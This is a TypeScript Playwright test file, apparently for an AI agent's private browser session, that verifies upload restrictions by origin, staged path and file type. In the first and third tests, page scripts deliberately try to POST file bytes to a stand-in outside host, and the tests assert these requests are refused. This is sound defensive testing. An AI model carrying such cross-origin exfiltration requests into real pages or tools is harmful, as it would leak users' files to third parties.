import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import * as path from 'node:path'
import type { Page } from 'playwright'
import { assert, test } from '#test'
import { prepareBrowserUploads } from '../task/uploads.ts'
import { SignInBroker } from './broker.ts'
import { PrivateBrowserSession } from './session.ts'

test(
  'private uploads admit only staged files at the chosen origin and block requests escaping afterward',
  { timeout: 30000 },
  async () => {
    const root = await mkdtemp(path.join(tmpdir(), 'sky-upload-browser-'))
    const source = path.join(root, 'example.pdf')
    await writeFile(source, '%PDF-1.4 synthetic example')
    await mkdir(path.join(root, 'task'))
    const uploads = await prepareBrowserUploads([source], 'https://atlas.example', path.join(root, 'task'))
    let page!: Page
    let posted = ''
    let escaped = 0
    const browser = await PrivateBrowserSession.launch({
      filesDir: path.join(root, 'downloads'),
      profileDir: path.join(root, 'profile'),
      uploads,
      headless: true,
      broker: new SignInBroker({
        sources: async () => [],
        connect: async () => {
          throw new Error('No credentials in this test')
        },
        approval: { allowLookup: async () => false, choose: async () => null },
      }),
      prepare: async (created) => {
        page = created
        await page.context().route('**/*', async (route) => {
          const request = route.request()
          if (new URL(request.url()).hostname === 'outside.example') escaped++
          if (new URL(request.url()).pathname === '/receive') {
            posted = request.postData() ?? ''
            await route.fulfill({ body: 'received' })
            return
          }
          await route.fulfill({
            contentType: 'text/html',
            body: '<title>Atlas example upload</title><h1>Choose documents</h1><input id="files" type="file" hidden><button onclick="document.getElementById(\'files\').click()">Choose files</button><script>document.getElementById("files").onchange = async event => { await fetch("/receive", { method: "POST", body: event.target.files[0] }); document.querySelector("h1").textContent = "Upload received"; }</script>',
          })
        })
      },
    })
    try {
      await browser.callTool('browser_navigate', { url: 'https://other.example' })
      await page.getByRole('button', { name: 'Choose files' }).click()
      const wrongOrigin = await browser.callTool('browser_file_upload', { paths: [uploads.files[0]!.path] })
      await browser.callTool('browser_navigate', { url: uploads.origin })
      await page.getByRole('button', { name: 'Choose files' }).click()
      const wrongFile = await browser.callTool('browser_file_upload', { paths: [source] })
      const selected = await browser.callTool('browser_file_upload', { paths: [uploads.files[0]!.path] })
      await page.getByRole('heading', { name: 'Upload received' }).waitFor()
      const receipt = await browser.callTool('browser_snapshot', {})
      const leaked = await page.evaluate(async () => {
        try {
          await fetch('https://outside.example/receive', { method: 'POST', body: 'example bytes' })
          return true
        } catch {
          return false
        }
      })
      assert({
        given: 'a private browser with a concrete upload manifest',
        should:
          'reject another origin and an unstaged path, upload the intended bytes, expose the receipt, and prevent cross-origin leakage',
        actual: [
          wrongOrigin.isError,
          wrongFile.isError,
          selected.isError,
          posted,
          JSON.stringify(receipt).includes('Upload received'),
          leaked,
          escaped,
        ],
        expected: [true, true, false, '%PDF-1.4 synthetic example', true, false, 0],
      })
    } finally {
      await browser.close()
      await rm(root, { recursive: true, force: true })
    }
  },
)

test(
  'private uploads reach the page with the type a browser gives each file by its name',
  { timeout: 30000 },
  async () => {
    const root = await mkdtemp(path.join(tmpdir(), 'sky-upload-types-'))
    const sources = ['example.png', 'example.txt', 'example.pdf', 'example.data'].map((name) => path.join(root, name))
    for (const source of sources) await writeFile(source, 'synthetic example')
    await mkdir(path.join(root, 'task'))
    const uploads = await prepareBrowserUploads(sources, 'https://atlas.example', path.join(root, 'task'))
    let page!: Page
    const browser = await PrivateBrowserSession.launch({
      filesDir: path.join(root, 'downloads'),
      profileDir: path.join(root, 'profile'),
      uploads,
      headless: true,
      broker: new SignInBroker({
        sources: async () => [],
        connect: async () => {
          throw new Error('No credentials in this test')
        },
        approval: { allowLookup: async () => false, choose: async () => null },
      }),
      prepare: async (created) => {
        page = created
        // A picture uploader's shape: the page reads the chosen file's type and turns away what it does not list.
        await page.context().route('**/*', (route) =>
          route.fulfill({
            contentType: 'text/html',
            body: '<title>Atlas example picture</title><h1>Choose a picture</h1><input id="picture" type="file" hidden><button onclick="document.getElementById(\'picture\').click()">Upload new picture</button><script>document.getElementById("picture").onchange = event => { const type = event.target.files[0].type; document.querySelector("h1").textContent = ["image/png", "image/gif", "image/jpeg"].includes(type) ? "Picture accepted: " + type : "Not a picture: " + type; }</script>',
          }),
        )
      },
    })
    try {
      await browser.callTool('browser_navigate', { url: uploads.origin })
      const seen: Array<string | null> = []
      for (const file of uploads.files) {
        await page.getByRole('button', { name: 'Upload new picture' }).click()
        await browser.callTool('browser_file_upload', { paths: [file.path] })
        seen.push(await page.getByRole('heading').textContent())
      }
      assert({
        given: 'staged files of four kinds, chosen on a page that checks the type',
        should: 'give the page each file’s usual type, without parameters, as a file picked from disk has',
        actual: seen,
        expected: [
          'Picture accepted: image/png',
          'Not a picture: text/plain',
          'Not a picture: application/pdf',
          'Not a picture: application/octet-stream',
        ],
      })
    } finally {
      await browser.close()
      await rm(root, { recursive: true, force: true })
    }
  },
)

test(
  'private uploads may send the chosen file to another address of the same website, and to no other website',
  { timeout: 30000 },
  async () => {
    const root = await mkdtemp(path.join(tmpdir(), 'sky-upload-website-'))
    const source = path.join(root, 'example.png')
    await writeFile(source, 'synthetic example picture')
    await mkdir(path.join(root, 'task'))
    const uploads = await prepareBrowserUploads([source], 'https://atlas.example', path.join(root, 'task'))
    let page!: Page
    const received: string[] = []
    const browser = await PrivateBrowserSession.launch({
      filesDir: path.join(root, 'downloads'),
      profileDir: path.join(root, 'profile'),
      uploads,
      headless: true,
      broker: new SignInBroker({
        sources: async () => [],
        connect: async () => {
          throw new Error('No credentials in this test')
        },
        approval: { allowLookup: async () => false, choose: async () => null },
      }),
      prepare: async (created) => {
        page = created
        // A site with its own upload host: the page hands the chosen file to it, then tries a stranger.
        await page.context().route('**/*', async (route) => {
          const request = route.request()
          const url = new URL(request.url())
          if (url.pathname === '/receive') {
            const headers = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*' }
            if (request.method() === 'POST') received.push(`${url.hostname}: ${request.postData() ?? ''}`)
            await route.fulfill({ status: request.method() === 'OPTIONS' ? 204 : 200, headers, body: '' })
            return
          }
          await route.fulfill({
            contentType: 'text/html',
            body: '<title>Atlas example picture</title><h1>Choose a picture</h1><input id="picture" type="file" hidden><button onclick="document.getElementById(\'picture\').click()">Upload new picture</button><script>document.getElementById("picture").onchange = async event => { const file = event.target.files[0]; const send = address => fetch(address, { method: "POST", body: file }).then(() => "sent", () => "refused"); document.querySelector("h1").textContent = "Same website: " + await send("https://uploads.atlas.example/receive") + ". Another website: " + await send("https://outside.example/receive"); }</script>',
          })
        })
      },
    })
    try {
      await browser.callTool('browser_navigate', { url: uploads.origin })
      await page.getByRole('button', { name: 'Upload new picture' }).click()
      await browser.callTool('browser_file_upload', { paths: [uploads.files[0]!.path] })
      await page.getByRole('heading', { name: /Another website/ }).waitFor()
      assert({
        given: 'a page that sends the chosen file to its own upload host, then to another website',
        should: 'let the bytes reach the same website’s host and keep them from the other website',
        actual: { page: await page.getByRole('heading').textContent(), received },
        expected: {
          page: 'Same website: sent. Another website: refused',
          received: ['uploads.atlas.example: synthetic example picture'],
        },
      })
    } finally {
      await browser.close()
      await rm(root, { recursive: true, force: true })
    }
  },
)
